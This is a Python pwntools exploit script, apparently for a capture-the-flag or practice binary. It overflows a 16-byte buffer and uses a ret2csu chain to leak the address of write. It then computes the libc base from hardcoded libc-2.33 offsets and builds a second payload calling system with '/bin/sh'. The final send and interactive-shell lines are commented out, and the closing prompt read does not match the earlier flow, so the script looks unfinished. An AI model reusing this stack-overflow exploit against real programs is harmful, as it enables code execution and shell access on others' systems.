from pwn import *
import os
context(log_level='debug',arch='amd64',os='linux') 
io = process('./question_5_plus_x64_bak')

elf = ELF('question_5_plus_x64_bak')
padding = 16

leak_func_got = elf.got['write']

func_addr = elf.symbols['dofunc']
write_sym = elf.symbols['write']

#gdb.attach(io)
#pause()

pop_rbx_addr = 0x401202
rbx = 0
rbp = 1
r12 = 1
r13 = leak_func_got
r14 = 8
r15 = elf.got['write']
mov_rdx_addr = 0x4011E8
rbx_1 = 0xdeadbeef
rbp_1 = 0xdeadbeef
r12_1 = 0xdeadbeef
r13_1 = 0xdeadbeef
r14_1 = 0xdeadbeef
r15_1 = 0xdeadbeef
ret_addr = func_addr

payload = flat([b'a'* padding, pop_rbx_addr, rbx, rbp, r12, r13, r14, r15, mov_rdx_addr, 0xdeadbeef, rbx_1, rbp_1, r12_1, r13_1, r14_1, r15_1, ret_addr])  #ret2csu
print(payload)


io.sendlineafter('input:',payload)




libc_file = './libc-2.33.so'
libc = ELF(libc_file)
io.recvuntil('bye')

write_addr = u64(io.recv(8)) 
print('write_addr:',hex(write_addr))

write_offset = 0xEE5F0  
print('write_offset:', write_offset)
libc_addr = write_addr - write_offset
print('libc_addr:',hex(libc_addr))

system_offset = 0x49860
print('system_offset:', system_offset)
system_addr = libc_addr + system_offset
print('system_addr:',hex(system_addr))

bin_sh_offset = 0x198882 
bin_sh_addr = libc_addr + bin_sh_offset
print('bin_sh_offset:', bin_sh_offset)
print('bin_sh_addr:',hex(bin_sh_addr))

pop_rdi_ret = 0x40120b

payload2 = flat([b'a' * padding, pop_rdi_ret, bin_sh_addr, system_addr])

# io.sendlineafter('input:',payload2)



# io.recvuntil('bye')
# io.interactive()
# io.recvuntil("Enter your choice: ")  # 假设目标程序会提示输入
# io.sendline("1")  # 发送你的输入

# 接收程序的输出
output = io.recvuntil("Option: ")
print(output)
